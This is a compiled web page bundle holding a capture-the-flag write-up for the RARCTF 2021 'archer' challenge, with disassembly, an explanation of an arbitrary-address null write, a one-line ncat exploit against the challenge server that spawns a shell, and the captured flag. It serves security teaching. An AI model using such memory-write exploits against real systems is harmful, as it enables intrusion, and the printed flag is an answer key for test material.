"use strict";(self.webpackChunkwriteups_docs=self.webpackChunkwriteups_docs||[]).push([[7902],{3905:(e,r,t)=>{t.d(r,{Zo:()=>f,kt:()=>m});var n=t(7294);function a(e,r,t){return r in e?Object.defineProperty(e,r,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[r]=t,e}function o(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);r&&(n=n.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,n)}return t}function c(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?o(Object(t),!0).forEach((function(r){a(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function s(e,r){if(null==e)return{};var t,n,a=function(e,r){if(null==e)return{};var t,n,a={},o=Object.keys(e);for(n=0;n<o.length;n++)t=o[n],r.indexOf(t)>=0||(a[t]=e[t]);return a}(e,r);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(n=0;n<o.length;n++)t=o[n],r.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(a[t]=e[t])}return a}var l=n.createContext({}),i=function(e){var r=n.useContext(l),t=r;return e&&(t="function"==typeof e?e(r):c(c({},r),e)),t},f=function(e){var r=i(e.components);return n.createElement(l.Provider,{value:r},e.children)},d="mdxType",p={inlineCode:"code",wrapper:function(e){var r=e.children;return n.createElement(n.Fragment,{},r)}},u=n.forwardRef((function(e,r){var t=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,f=s(e,["components","mdxType","originalType","parentName"]),d=i(t),u=a,m=d["".concat(l,".").concat(u)]||d[u]||p[u]||o;return t?n.createElement(m,c(c({ref:r},f),{},{components:t})):n.createElement(m,c({ref:r},f))}));function m(e,r){var t=arguments,a=r&&r.mdxType;if("string"==typeof e||a){var o=t.length,c=new Array(o);c[0]=u;var s={};for(var l in r)hasOwnProperty.call(r,l)&&(s[l]=r[l]);s.originalType=e,s[d]="string"==typeof e?e:a,c[1]=s;for(var i=2;i<o;i++)c[i]=t[i];return n.createElement.apply(null,c)}return n.createElement.apply(null,t)}u.displayName="MDXCreateElement"},6670:(e,r,t)=>{t.r(r),t.d(r,{assets:()=>l,contentTitle:()=>c,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>i});var n=t(7462),a=(t(7294),t(3905));const o={},c="ARCHER",s={unversionedId:"2021/RARCTF/challenges/archer",id:"2021/RARCTF/challenges/archer",title:"ARCHER",description:"- File  : archer",source:"@site/docs/2021/RARCTF/challenges/archer.md",sourceDirName:"2021/RARCTF/challenges",slug:"/2021/RARCTF/challenges/archer",permalink:"/docs/2021/RARCTF/challenges/archer",draft:!1,editUrl:"https://github.com/Pynard/writeups-docs/tree/main/packages/create-docusaurus/templates/shared/docs/2021/RARCTF/challenges/archer.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"RARCTF",permalink:"/docs/2021/RARCTF/"},next:{title:"# BABYCRYPT",permalink:"/docs/2021/RARCTF/challenges/babycrypt"}},l={},i=[],f={toc:i};function d(e){let{components:r,...t}=e;return(0,a.kt)("wrapper",(0,n.Z)({},f,t,{components:r,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"archer"},"ARCHER"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"It's battle time! We're giving you one shot, one kill - choose wisely.\n")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"File  : ",(0,a.kt)("a",{parentName:"li",href:"../attachements/archer/archer"},"archer"))),(0,a.kt)("p",null,"The binary ask us to send an arrow to win a battle,\\\nthe goal is to spawn a shell by not verifying this conditional jump @0x0040123b"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'\u2502           0x0040122e      488b05332e00.  mov rax, qword [obj.code]   ; [0x404068:8]=0x13371337 ; "7\\x137\\x13"\n\u2502           0x00401235      483d37133713   cmp rax, 0x13371337\n\u2502       \u250c\u2500< 0x0040123b      750a           jne 0x401247\n\u2502       \u2502   0x0040123d      bf00000000     mov edi, 0\n\u2502       \u2502   0x00401242      e849feffff     call sym.imp.exit\n\u2502       \u2502   ; CODE XREF from main @ 0x40123b\n\u2502       \u2514\u2500> 0x00401247      488d3d6b0e00.  lea rdi, str.WE_WON_        ; 0x4020b9 ; "WE WON!"\n\u2502           0x0040124e      e8ddfdffff     call sym.imp.puts\n\u2502           0x00401253      488b05162e00.  mov rax, qword [obj.stdout] ; obj.__TMC_END__\n\u2502                                                                      ; [0x404070:8]=0\n\u2502           0x0040125a      4889c7         mov rdi, rax\n\u2502           0x0040125d      e80efeffff     call sym.imp.fflush\n\u2502           0x00401262      488d3d580e00.  lea rdi, str._bin_sh        ; 0x4020c1 ; "/bin/sh"\n\u2502           0x00401269      e8d2fdffff     call sym.imp.system\n\u2502           0x0040126e      b800000000     mov eax, 0\n\u2502           0x00401273      c9             leave\n\u2514           0x00401274      c3             ret\n')),(0,a.kt)("p",null,"before that it asks us to give him a target, here a memory address :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'\u250c 111: sym.makeshot ();\n\u2502           ; var int64_t var_8h @ rbp-0x8\n\u2502           0x00401275      55             push rbp\n\u2502           0x00401276      4889e5         mov rbp, rsp\n\u2502           0x00401279      4883ec10       sub rsp, 0x10\n\u2502           0x0040127d      488d3d450e00.  lea rdi, str.Heres_your_arrow_ ; 0x4020c9 ; "Here\'s your arrow!"\n\u2502           0x00401284      e8a7fdffff     call sym.imp.puts\n\u2502           0x00401289      488d3d500e00.  lea rdi, str.Now__which_soldier_do_you_wish_to_shoot_ ; 0x4020e0 ; "Now, which soldier do you wish to shoot?"\n\u2502           0x00401290      e89bfdffff     call sym.imp.puts\n\u2502           0x00401295      488b05d42d00.  mov rax, qword [obj.stdout] ; obj.__TMC_END__\n\u2502                                                                      ; [0x404070:8]=0\n\u2502           0x0040129c      4889c7         mov rdi, rax\n\u2502           0x0040129f      e8ccfdffff     call sym.imp.fflush\n\u2502           0x004012a4      488d45f8       lea rax, [var_8h]\n\u2502           0x004012a8      4889c6         mov rsi, rax\n\u2502           0x004012ab      488d3d570e00.  lea rdi, [0x00402109]       ; "%p"\n\u2502           0x004012b2      b800000000     mov eax, 0\n\u2502           0x004012b7      e8c4fdffff     call sym.imp.__isoc99_scanf\n\u2502           0x004012bc      488b45f8       mov rax, qword [var_8h]\n\u2502           0x004012c0      480500005000   add rax, 0x500000\n\u2502           0x004012c6      488945f8       mov qword [var_8h], rax\n\u2502           0x004012ca      488b45f8       mov rax, qword [var_8h]\n\u2502           0x004012ce      48c700000000.  mov qword [rax], 0\n\u2502           0x004012d5      488d3d300e00.  lea rdi, str.Shot_          ; 0x40210c ; "Shot!"\n\u2502           0x004012dc      e84ffdffff     call sym.imp.puts\n\u2502           0x004012e1      90             nop\n\u2502           0x004012e2      c9             leave\n\u2514           0x004012e3      c3             ret\n')),(0,a.kt)("p",null,"In this function a null byte is placed at the address +0x500000 you type via scanf\\\nThe solution is to give the memory address of 0x13371337 @0x404068 minus 0x500000"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ( echo yes ; python -c \"print(hex(0x404068-0x500000))\" ; cat ) | ncat 193.57.159.27 43092\nIt's battle day archer! Have you got what it takes?\nAnswer [yes/no]: Awesome! Make your shot.\nHere's your arrow!\nNow, which soldier do you wish to shoot?\nShot!\nHope you shot well! This will decide the battle.\nWE WON!\nls\narcher\nflag_0a52f21b1a.txt\ncat flag_0a52f21b1a.txt\nrarctf{sw33t_sh0t!_1nt3g3r_0v3rfl0w_r0cks!_170b2820c9}\n")),(0,a.kt)("p",null,"flag : ",(0,a.kt)("inlineCode",{parentName:"p"},"rarctf{sw33t_sh0t!_1nt3g3r_0v3rfl0w_r0cks!_170b2820c9}")))}d.isMDXComponent=!0}}]);